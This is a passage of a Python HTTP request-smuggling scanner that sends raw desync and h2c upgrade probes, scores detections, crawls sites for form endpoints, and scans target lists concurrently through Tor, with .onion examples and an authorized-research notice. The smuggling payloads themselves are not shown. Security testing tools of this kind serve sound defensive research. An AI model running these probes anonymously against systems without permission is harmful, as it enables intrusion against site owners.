                        ('Host', parsed.netloc),
                        ('Content-Type', 'application/x-www-form-urlencoded'),
                        ('X-Raw-Test', 'true')
                    ])
                    
                    request = self.raw_client.build_complete_request(
                        method='POST',
                        host=parsed.hostname,
                        port=parsed.port or 80,
                        path=parsed.path or '/',
                        headers=headers,
                        body='test=raw'
                    )
                    
                    raw_response = self.raw_client.send_request(
                        parsed.hostname,
                        parsed.port or 80,
                        request,
                        timeout=10
                    )
                    
                    raw_result['raw_response'] = raw_response[:500]
                    raw_result['success'] = raw_response and len(raw_response) > 0
                
                if raw_result['success']:
                    self.log(f"Raw validation SUCCESS for {detection['name']}", 
                            "SUCCESS", 1)
                else:
                    self.log(f"Raw validation inconclusive for {detection['name']}", 
                            "WARNING", 1)
                
                raw_results.append(raw_result)
                
                if self.delay > 0:
                    time.sleep(self.delay)
                    
            except Exception as e:
                error_msg = str(e)[:50]
                self.log(f"Raw validation failed: {error_msg}", "ERROR", 1)
                raw_results.append({
                    'detection': detection['name'],
                    'error': error_msg,
                    'success': False
                })
                continue
        
        return raw_results
    
    def _perform_raw_h2c_validation(self, parsed, detection):
        """Specialized raw H2C validation"""
        result = {
            'detection': detection['name'],
            'technique': 'H2C',
            'success': False,
            'details': {}
        }
        
        try:
            # Build raw H2C upgrade request
            h2c_request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            h2c_request += f"Host: {parsed.netloc}\r\n"
            h2c_request += "Upgrade: h2c\r\n"
            h2c_request += "HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
            h2c_request += "Connection: Upgrade, HTTP2-Settings\r\n"
            h2c_request += "Content-Length: 0\r\n"
            h2c_request += "X-Raw-H2C-Test: true\r\n"
            h2c_request += "\r\n"
            
            # Send via raw client
            raw_response = self.raw_client.send_request(
                parsed.hostname,
                parsed.port or 80,
                h2c_request,
                timeout=15
            )
            
            result['raw_response'] = raw_response[:500]
            
            # Analyze H2C-specific response
            if raw_response:
                # Look for HTTP/2 preface or upgrade headers
                if '101 Switching Protocols' in raw_response:
                    result['success'] = True
                    result['details']['evidence'] = 'raw_H2C_upgrade_101'
                elif 'HTTP/2.0' in raw_response or 'HTTP/2' in raw_response:
                    result['success'] = True
                    result['details']['evidence'] = 'raw_HTTP2_detected'
                elif '200 OK' in raw_response[:100]:
                    result['success'] = True
                    result['details']['evidence'] = 'raw_H2C_200_suspicious'
                elif '400 Bad Request' in raw_response[:100]:
                    result['details']['evidence'] = 'raw_H2C_rejected_400'
                else:
                    result['details']['evidence'] = 'raw_H2C_unexpected_response'
            
        except Exception as e:
            result['error'] = str(e)[:50]
        
        return result
    
    # ==================== MAIN SCAN ENGINE ====================
    def scan_target(target, base_args, tor_session):
        """
        Isolated scan worker (IMPORTANT: no shared state)
        """

        try:
            scanner = EliteDESYNCScanner(
                tor_session=tor_session,
                verbose=base_args.verbose,
                delay=base_args.delay,
                threads=base_args.threads,
                enable_raw=not base_args.no_raw,
                enable_validation=not base_args.no_validation
            )

            result = scanner.scan(target)
            return {
                "target": target,
                "success": True,
                "result": result
            }

        except Exception as e:
            return {
                "target": target,
                "success": False,
                "error": str(e)
            }
    
    def scan(self, target_url):
        """Complete PortSwigger-style scan"""
        self.evidence_engine = EvidenceEngine()
        self.results['target'] = target_url
        self.results['tor_ip'] = self.tor.get_tor_ip()
        
        self.log(f"Starting DESYNC scan on: {target_url}", "INFO", 0)
        self.log(f"Scan ID: {self.results['scan_id']}", "DETAIL", 1)
        self.log(f"Tor exit: {self.results['tor_ip']}", "DETAIL", 1)
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"PORT SWIGGER METHODOLOGY - COMPLETE SCAN")
        print(f"{'='*70}{Style.RESET_ALL}\n")
        
        # PHASE 1: Comprehensive Baseline
        self.log("PHASE 1: Comprehensive Baseline Analysis", "INFO", 0)
        self.results['baselines'] = self.establish_comprehensive_baseline(target_url)
        
        # PHASE 2: Complete Payload Testing
        self.log("\nPHASE 2: Complete Payload Testing", "INFO", 0)
        all_payloads = PortSwiggerPayloads.get_all_payloads()
        detections = []
        
        # Test by technique group
        technique_groups = PortSwiggerPayloads.get_technique_groups()
        for technique, payloads in technique_groups.items():
            self.log(f"\nTesting {technique} technique ({len(payloads)} payloads)", 
                    "TECHNIQUE", 1)
            
            for payload in payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                result = self.test_payload_with_analysis(
                    target_url, payload, self.results['baselines']
                )
                
                if result['analysis']['confidence'] in ['medium', 'high', 'confirmed']:
                    detections.append(result)
                    self.results['detections'].append(result)
        
        # PHASE 3: Validation
        if detections and self.enable_validation:
            self.log("\nPHASE 3: Validation Testing", "INFO", 0)
            
            for detection in detections:
                if detection['analysis']['confidence'] in ['high', 'confirmed']:
                    validation = self.perform_validation(target_url, detection)
                    self.results['validations'].append(validation)
                    
                    if validation['confirmed']:
                        self.results['confirmed'].append({
                            'detection': detection,
                            'validation': validation
                        })
        
        # PHASE 4: Raw Validation (if enabled)
        if detections and self.enable_raw:
            self.log("\nPHASE 4: Raw HTTP Validation", "INFO", 0)
            raw_results = self.perform_raw_validation(target_url, detections)
            self.results['raw_validation'] = raw_results
        
        # Generate final assessment
        self._generate_final_assessment()
        
        return self.results
    
    def _generate_final_assessment(self):
        """Generate PortSwigger-style final assessment"""
        # Count by technique
        technique_counts = {}
        for detection in self.results['detections']:
            tech = detection['technique']
            technique_counts[tech] = technique_counts.get(tech, 0) + 1
        
        # Count by confidence
        confidence_counts = {'high': 0, 'medium': 0, 'low': 0, 'confirmed': 0}
        for detection in self.results['detections']:
            conf = detection['analysis']['confidence']
            if conf in confidence_counts:
                confidence_counts[conf] += 1
        
        # Summary
        self.results['technique_summary'] = technique_counts
        self.results['confidence_summary'] = confidence_counts
        
        # Risk assessment
        risk = 'LOW'
        if self.results['confirmed']:
            risk = 'CRITICAL'
        elif confidence_counts['high'] > 0:
            risk = 'HIGH'
        elif confidence_counts['medium'] > 3:
            risk = 'MEDIUM'
        
        self.results['risk_assessment'] = {
            'level': risk,
            'factors': {
                'confirmed_vulns': len(self.results['confirmed']),
                'high_confidence_detections': confidence_counts['high'],
                'total_detections': len(self.results['detections'])
            }
        }
        
        # Recommendations
        recommendations = []
        if risk == 'CRITICAL':
            recommendations = [
                "IMMEDIATE manual validation required",
                "Potential request smuggling confirmed",
                "Consider responsible disclosure if appropriate"
            ]
        elif risk == 'HIGH':
            recommendations = [
                "High priority for manual validation",
                "Strong indicators of HTTP smuggling",
                "Test with Burp Suite for confirmation"
            ]
        elif risk == 'MEDIUM':
            recommendations = [
                "Further investigation recommended",
                "Test additional endpoints/paths",
                "Consider Client-Side Desync testing"
            ]
        else:
            recommendations = [
                "No strong evidence of HTTP smuggling",
                "Server appears to handle HTTP correctly",
                "Retest after major updates"
            ]
        
        self.results['recommendations'] = recommendations
    
    def generate_report(self, output_file=None):
        """Generate comprehensive report"""
        report = self.results.copy()
        
        # Add metadata
        report['scanner_version'] = 'DESYNC-SCAN-v1'
        report['methodology'] = 'Complete HTTP Desync Research'
        
        # Format for output
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    json.dump(report, f, indent=2, default=str)
                self.log(f"Report saved to {output_file}", "SUCCESS")
            except Exception as e:
                self.log(f"Failed to save report: {e}", "ERROR")
        
        return report

# ============================================================================
# UTILITY HELPERS
# ============================================================================

def load_targets(file_path):
    """Load targets from a text file safely"""
    targets = []

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                target = line.strip()

                if not target or target.startswith("#"):
                    continue

                if not target.startswith("http"):
                    target = "http://" + target

                targets.append(target)

        return targets

    except Exception as e:
        print(f"[!] Failed to load targets file: {e}")
        return []

# ============================================================================
# MAIN EXECUTION
# ============================================================================


def print_elite_banner():
    """Print elite banner"""
    banner = f"""{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════ ╗
║   ██████╗ ███████╗███████╗██╗   ██╗███╗   ██╗ ██████╗    ██████╗ ███████╗ ║
║   ██╔══██╗██╔════╝██╔════╝╚██╗ ██╔╝████╗  ██║██╔════╝    ██╔══██╗██╔════╝ ║
║   ██║  ██║█████╗  ███████╗ ╚████╔╝ ██╔██╗ ██║██║  ███╗   ██████╔╝█████╗   ║
║   ██║  ██║██╔══╝  ╚════██║  ╚██╔╝  ██║╚██╗██║██║   ██║   ██╔══██╗██╔══╝   ║
║   ██████╔╝███████╗███████║   ██║   ██║ ╚████║╚██████╔╝   ██║  ██║███████╗ ║
║   ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝    ╚═╝  ╚═╝╚══════╝ ║
║                                                                           ║
║                       DESYNC-HTTP SMUGGLING SCANNER.                      ║
║                                                                           ║
║                        For Authorized Research Only                       ║
╚══════════════════════════════════════════════════════════════════════════ ╝
{Style.RESET_ALL}"""
    print(banner)

def print_summary(scanner):
    """Print summary"""
    results = scanner.results
    
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"SCAN SUMMARY - {results['timestamp']}")
    print(f"{'='*70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.WHITE}Target: {results['target']}")
    print(f"Scan ID: {results['scan_id']}")
    print(f"Tor Exit: {results['tor_ip']}")
    
    print(f"\n{Fore.YELLOW}📊 DETECTION SUMMARY:")
    print(f"  • Total Payloads Tested: {len(PortSwiggerPayloads.get_all_payloads())}")
    print(f"  • Detections Found: {len(results['detections'])}")
    print(f"  • Validations Performed: {len(results['validations'])}")
    print(f"  • Confirmed Vulnerabilities: {len(results['confirmed'])}")
    
    if results['technique_summary']:
        print(f"\n  • Technique Breakdown:")
        for tech, count in results['technique_summary'].items():
            print(f"      {tech}: {count}")
    
    print(f"\n{Fore.CYAN}🎯 RISK ASSESSMENT:")
    risk = results['risk_assessment']
    risk_color = {
        'CRITICAL': Fore.RED + Style.BRIGHT,
        'HIGH': Fore.RED,
        'MEDIUM': Fore.YELLOW,
        'LOW': Fore.GREEN
    }.get(risk['level'], Fore.WHITE)
    
    print(f"  • Level: {risk_color}{risk['level']}{Style.RESET_ALL}")
    
    if risk['factors']['confirmed_vulns'] > 0:
        print(f"  • {Fore.RED}🚨 CONFIRMED: {risk['factors']['confirmed_vulns']} validated vulnerabilities")
    
    print(f"\n{Fore.MAGENTA}💡 RECOMMENDATIONS:")
    for i, rec in enumerate(results['recommendations'], 1):
        print(f"  {i}. {rec}")
    
    # Show top detections if any
    if results['detections']:
        print(f"\n{Fore.CYAN}🔍 TOP DETECTIONS:")
        high_detections = [d for d in results['detections'] 
                          if d['analysis']['confidence'] in ['high', 'confirmed']]
        
        for detection in high_detections[:5]:
            print(f"  • {detection['name']} ({detection['technique']})")
            print(f"    Confidence: {detection['analysis']['confidence']}")
            if detection['analysis']['key_indicators']:
                print(f"    Indicators: {', '.join(detection['analysis']['key_indicators'][:3])}")
    
    print(f"\n{Fore.GREEN}[+] Scan completed successfully!")
    print(f"[+] Scanner: DESYNC-SCAN-v1.0")


def print_async_summary(all_results):
    print("\n" + "="*70)
    print("ASYNC SCAN COMPLETE")
    print("="*70)

    total = len(all_results)
    success = len([r for r in all_results if r["success"]])

    print(f"[+] Total targets: {total}")
    print(f"[+] Successful: {success}")
    print(f"[+] Failed: {total - success}")



# ASYNC WORKER ENGINE 

class AsyncScanEngine:
    """
    Async worker pool
    """

    def __init__(self, scanner_class, tor_session, args):
        self.scanner_class = scanner_class
        self.tor_session = tor_session
        self.args = args

        self.semaphore = asyncio.Semaphore(args.threads)
        self.results = []
        self.lock = asyncio.Lock()

        # tracking
        self.completed = 0
        self.failed = 0

        # safety: prevent stuck scans
        self.scan_timeout = getattr(args, "timeout", 60)

    # ================================
    # MAIN ENTRY
    # ================================
    async def run_scan(self, targets: List[str]):
        """
        Main async entry point
        """

        print(f"\n[+] Async engine started with {self.args.threads} workers\n")

        tasks = [
            asyncio.create_task(self.worker(t))
            for t in targets
        ]

        await asyncio.gather(*tasks)

        return self.results

    # ================================
    # WORKER
    # ================================
    async def worker(self, target: str):
        """
        Single isolated scan worker
        """

        async with self.semaphore:
            start = time.time()

            try:
                # TIMEOUT WRAPPER (IMPORTANT FIX)
                result = await asyncio.wait_for(
                    asyncio.to_thread(self._run_sync_scan, target),
                    timeout=self.scan_timeout
                )

                duration = round(time.time() - start, 2)

                record = {
                    "target": target,
                    "success": True,
                    "duration": duration,
                    "result": result
                }

                async with self.lock:
                    self.results.append(record)
                    self.completed += 1

                print(f"[✓] {target} ({duration}s)")

            except Exception as e:
                duration = round(time.time() - start, 2)

                record = {
                    "target": target,
                    "success": False,
                    "error": str(e)
                }

                async with self.lock:
                    self.results.append(record)
                    self.failed += 1

                print(f"[!] {target} FAILED → {e}")

    # ================================
    # SYNC BRIDGE
    # ================================
    def _run_sync_scan(self, target):
        """
        Bridge async → blocking scanner
        """

        scanner = self.scanner_class(
            tor_session=self.tor_session,
            verbose=self.args.verbose,
            delay=self.args.delay,
            threads=1,
            enable_raw=not self.args.no_raw,
            enable_validation=not self.args.no_validation
        )

        return scanner.scan(target)

# CRAWLER
class AsyncCrawler:
    """
    Async endpoint discovery engine
    """

    def __init__(self, base_url, max_depth=2, concurrency=20):
        self.proxy = "socks5://127.0.0.1:9050"
        self.base_url = base_url
        self.max_depth = max_depth
        self.semaphore = asyncio.Semaphore(concurrency)

        self.visited = set()
        self.found = set()
        self.domain = urlparse(base_url).netloc

    async def crawl(self):
        connector = ProxyConnector.from_url(self.proxy)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=20),
            headers={"User-Agent": "DESYNC-Crawler/1.0"}
        ) as session:

            await self._crawl(session, self.base_url, 0)

        return list(self.found)

    async def _crawl(self, session, url, depth):
        if depth > self.max_depth or url in self.visited:
            return

        self.visited.add(url)

        try:
            async with self.semaphore:
                async with session.get(url, allow_redirects=True, timeout=15) as resp:

                    if resp.status != 200:
                        return

                    content_type = resp.headers.get("Content-Type", "").lower()

                    if any(x in content_type for x in [
                        "image", "png", "jpg", "jpeg", "gif", "ico",
                        "video", "audio", "octet-stream", "zip", "pdf", "font"
                    ]):
                        return

                    try:
                        html = await resp.text(errors="ignore")
                    except:
                        raw = await resp.read()
                        html = raw.decode("utf-8", errors="ignore")

        except Exception as e:
            print(f"[crawler-error] {url} → {e}")
            return

        self.found.add(url)

        warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

        try:
            soup = BeautifulSoup(html, "lxml")
        except:
            soup = BeautifulSoup(html, "html.parser")


        # =========================
        # LINKS
        # =========================
        for a in soup.find_all("a", href=True):
            link = urljoin(url, a["href"])

            if urlparse(link).netloc == self.domain:
                await self._crawl(session, link, depth + 1)

        # =========================
        # FORMS (HIGH VALUE DESYNC TARGETS)
        # =========================
        for form in soup.find_all("form"):
            action = form.get("action")
            method = (form.get("method") or "get").lower()

            if action:
                endpoint = urljoin(url, action)

                if urlparse(endpoint).netloc == self.domain:
                    self.found.add(endpoint)

                    if method == "post":
                        self.found.add(endpoint)
                        self.found.add(endpoint + "?")
                        self.found.add(endpoint + "?test=1")

        # =========================
        # PARAMETER HANDLING
        # =========================
        parsed = urlparse(url)

        if parsed.query:
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            self.found.add(base)
            self.found.add(url)

        # =========================
        # DESYNC SURFACE GENERATION
        # =========================
        self.found.add(url + "?")
        self.found.add(url + "/")
        self.found.add(url + "?test=1")

    def _process_link(self, session, link, depth):
        parsed = urlparse(link)

        if parsed.netloc and parsed.netloc != self.domain:
            return

        # normalize (strip fragments)
        link = link.split("#")[0]

        #await self._crawl(session, link, depth + 1)


    async def _schedule(self, session, link, depth):
        """
        Safe async recursion controller (prevents task explosion)
        """
        await self._crawl(session, link, depth)

    def _is_valid(self, url):
        try:
            parsed = urlparse(url)

            return (
                parsed.scheme in ("http", "https") and
                parsed.netloc == self.domain and
                url not in self.visited
            )
        except:
            return False

def main():
    """Main execution"""
    parser = argparse.ArgumentParser(
        description="DESYNC-HTTP Smuggling Scanner v1.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{Fore.CYAN}
Examples:
  {sys.argv[0]} -u http://target.onion
  {sys.argv[0]} -u https://example.com -v --delay 1.5 --threads 5
  {sys.argv[0]} -u http://target.onion -o report.json --no-validation
  {sys.argv[0]} -u http://target.onion --tor-port 9150 --timeout 45
  {sys.argv[0]} -u http://target.onion --crawl --depth 4 -v --threads 10
  {sys.argv[0]} --targets targets.txt --tor-port 9150 --timeout 45 --threads 7

        
{Fore.RED}Legal & Ethical Notice:{Style.RESET_ALL}
  This tool is for AUTHORIZED security research only.
  You MUST have explicit permission to scan any target.
  Compliance with all applicable laws is required.
  The developers assume NO liability for misuse.
        """
    )
    
    parser.add_argument('-u', '--url',
                   help='Target URL (required if not using --targets / onion or clearnet)')
    parser.add_argument('--targets', type=str,
                    help='Path to targets.txt file (one URL per line)')
    parser.add_argument('-d', '--delay', type=float, default=1.0,
                       help='Delay between requests (seconds, default: 1.0)')
    parser.add_argument('-t', '--timeout', type=int, default=30,
                       help='Request timeout (seconds, default: 30)')
    parser.add_argument('--threads', type=int, default=3,
                       help='Session pool size (default: 3)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('--no-validation', action='store_true',
                       help='Disable validation tests')
    parser.add_argument('--no-raw', action='store_true',
                       help='Disable raw HTTP validation')
    parser.add_argument('-o', '--output',
                       help='Save JSON report to file')
    parser.add_argument('--tor-host', default='127.0.0.1',
                       help='Tor proxy host (default: 127.0.0.1)')
    parser.add_argument('--tor-port', type=int, default=9050,
                       help='Tor proxy port (default: 9050)')
    parser.add_argument('--no-tor-check', action='store_true',
                       help='Skip Tor connection test (not recommended)')
    parser.add_argument('--crawl', action='store_true',
                    help='Enable crawler before scanning')
    parser.add_argument('--depth', type=int, default=2,
                    help='Crawler depth (default: 2)')
    
    args = parser.parse_args()

   # ---------------- VALIDATION ----------------
    if not args.url and not args.targets:
        print("[-] Error: provide --url or --targets")
        sys.exit(1)

    if args.url and args.targets:
        print("[-] Error: use only one mode")
        sys.exit(1)

    print_elite_banner()

    # ---------------- TOR ----------------
    try:
        tor_session = EliteTorSession(
            tor_proxy=args.tor_host,
            tor_port=args.tor_port,
            timeout=args.timeout,
            pool_size=args.threads
        )

        if not args.no_tor_check:
            if not tor_session.test_tor_connection():
                print("[-] Tor connection failed")
                sys.exit(1)

    except Exception as e:
        print(f"[-] Tor init failed: {e}")
        sys.exit(1)


    # ---------------- RUN ASYNC PIPELINE ----------------
    try:
        asyncio.run(async_main(args, tor_session))

    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(0)

    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        sys.exit(1)


async def async_main(args, tor_session):
    import json

    # ---------------- BUILD BASE TARGET LIST ----------------
    if args.targets:
        targets = load_targets(args.targets)
    else:
        targets = [args.url]

    # ---------------- CRAWL PHASE ----------------
    if args.crawl:
        print(f"\n[+] Crawling {args.url} (depth={args.depth})...\n")

        crawler = AsyncCrawler(
            args.url,
            max_depth=args.depth,
            concurrency=20
        )

        crawled = await crawler.crawl()

        print(f"[+] Crawled endpoints: {len(crawled)}")

        targets = list(set(targets + crawled))

    # ---------------- CLEAN TARGETS ----------------
    targets = [t for t in targets if t and isinstance(t, str)]

    print(f"\n[+] Final target count: {len(targets)}\n")

    if not targets:
        print("[-] No targets found")
        return

    # ---------------- ENGINE ----------------
    print(f"[+] Starting ASYNC scan on {len(targets)} targets...\n")

    engine = AsyncScanEngine(
        EliteDESYNCScanner,
        tor_session,
        args
    )

    results = await engine.run_scan(targets)

    # ---------------- SUMMARY ----------------
    successful = [r for r in results if r.get("success")]
    failed = [r for r in results if not r.get("success")]

    print("\n" + "=" * 60)
    print("SCAN COMPLETE")
    print("=" * 60)

    print(f"[+] Total: {len(results)}")
    print(f"[+] Success: {len(successful)}")
    print(f"[+] Failed: {len(failed)}")

    # ---------------- SAVE ----------------
    if args.output:
        report = {
            "summary": {
                "total": len(results),
                "success": len(successful),
                "failed": len(failed)
            },
            "results": results
        }

        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, default=str)

        print(f"[+] Report saved → {args.output}")


if __name__ == "__main__":
    main()